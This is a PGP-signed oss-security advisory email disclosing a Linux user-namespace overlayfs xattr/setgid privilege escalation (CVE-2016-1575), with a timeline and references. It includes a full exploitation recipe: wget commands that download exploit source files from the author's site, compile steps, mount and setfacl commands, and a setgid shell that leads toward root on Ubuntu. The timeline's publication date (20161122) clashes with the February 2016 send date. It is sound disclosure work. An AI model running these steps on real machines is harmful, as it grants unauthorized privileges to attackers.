X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4133" "Wednesday" "24" "February" "2016" "05:58:04" "+0000" "halfdog" "me@halfdog.net" "<7da766ba-0f9d-5902-9267-66c38cd31f4e@halfdog.net>" "128" "[oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation: Overlayfs" nil nil nil "2" "2016022405:58:04" "[oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation: Overlayfs" (number mark "U       me@halfdog.n Feb 24  128/4133  " thread-indent "\"[oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation: Overlayfs\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 29933 invoked by uid 550); 24 Feb 2016 06:04:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29857 invoked from network); 24 Feb 2016 06:03:47 -0000
From: halfdog <me@halfdog.net>
To: oss-security@lists.openwall.com
Message-ID: <7da766ba-0f9d-5902-9267-66c38cd31f4e@halfdog.net>
Date: Wed, 24 Feb 2016 05:58:04 +0000
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit
Subject: [oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation:
 Overlayfs

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[http://www.halfdog.net/Security/2016/UserNamespaceOverlayfsXattrSetgidPrivilegeEscalation/]

Introduction:
=============

* Problem description:

Linux user namespace allows to mount file systems as normal user,
including the overlayfs. As many of those features were not designed
with namespaces in mind, this increase the attack surface of the Linux
kernel interface.

Overlayfs was intended to allow create writeable filesystems when
running on readonly medias, e.g. on a live-CD. In such scenario, the
lower filesystem contains the read-only data from the medium, the
upper filesystem part is mixed with the lower part. This mixture is
then presented as an overlayfs at a given mount point. When writing to
this overlayfs, the write will only modify the data in upper, which
may reside on a tmpfs for that purpose.

Due to inheritance of Posix ACL information (xattrs) when copying up
overlayfs files and not cleaning those additional and unintended ACL
attribues, SGID directories may become user writable, thus allowing to
gain privileges of this group using methods described in [0]. On
standard Ubuntu system, this allows to gain access to groups staff,
mail, libuuid.


Methods:
========

* Target Selection:

Suitable target directories can be easily found using find / -perm
- -02020 2> /dev/null. On standard Ubuntu system those are:

/usr/local/lib/python3.4 (root.staff)
/var/lib/libuuid (libuuid.libuuid)
/var/local (root.staff)
/var/mail (root.mail)
Exploitation:

Exploitation can be done just combining standard tools with the [0]
exploit. The following steps include command variants needed for
different operating systems. They have to be executed in two
processes, one inside the user namespace, the other one outside of it.

Inside:

test$ wget -q
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c
http://www.halfdog.net/Misc/Utils/SuidExec.c
test$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
test$ gcc -o UserNamespaceExec UserNamespaceExec.c
test$ gcc -o SuidExec SuidExec.c
test$ ./UserNamespaceExec -- /bin/bash
root# mkdir mnt test work
root# mount -t overlayfs -o lowerdir=[parent of
targetdir],upperdir=test overlayfs mnt # Ubuntu Trusty
root# mount -t overlayfs -o lowerdir=[parent of
targetdir],upperdir=test,workdir=work overlayfs mnt # Ubuntu Wily

Outside:

test$ setfacl -m d:u:test:rwx test # Ubuntu Trusty
test$ setfacl -m d:u::rwx,d:u:test:rwx work/work # Ubuntu Wily

Inside:

root# chmod 02777 mnt/[targetdir]
root# umount mnt

Outside:

test$ ./CreateSetgidBinary test/[targetdir]/escalate /bin/mount x
nonexistent-arg
test$ test/[targetdir]/escalate ./SuidExec /bin/bash
test$ touch x
test$ ls -al x
- -rw-r--r-- 1 test [targetgroup] 0 Jan 16 20:39 x

Results, Discussion:
====================

On Ubuntu, exploitation allows interference with mail spool and allows
to gain privileges of other python processes using python
dist-packages owned by user root.staff. If root user calls a python
process in that way, e.g. via apport crash dump tool, local root
escalation is completed.

According to [1], directories or binaries owned by group staff are in
the default PATH of the root user, hence local root escalation is trivial.

Timeline:
=========

* 20160116: Discovery, report at Launchpad [2]
* 20160122: Patch to disable unprivileged userns due to this and other
issues [3]
* 20160217: CVE-2016-1575 linked on launchpad [4]
* 20161122: CRD and publication

References:
===========

[0]
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
[1] http://www.openwall.com/lists/oss-security/2016/01/16/7
[2] https://bugs.launchpad.net/bugs/1534961
[3] https://lkml.org/lkml/2016/1/22/7
[4] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1575

hd

- -- 
http://www.halfdog.net/
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlbNRmEACgkQxFmThv7tq+7ouwCfXDh+7HyLW11LYgPWluK/+f3j
dMsAnAodbxwlOd0oMnEjeoa9QCFFoBqq
=ubsA
-----END PGP SIGNATURE-----
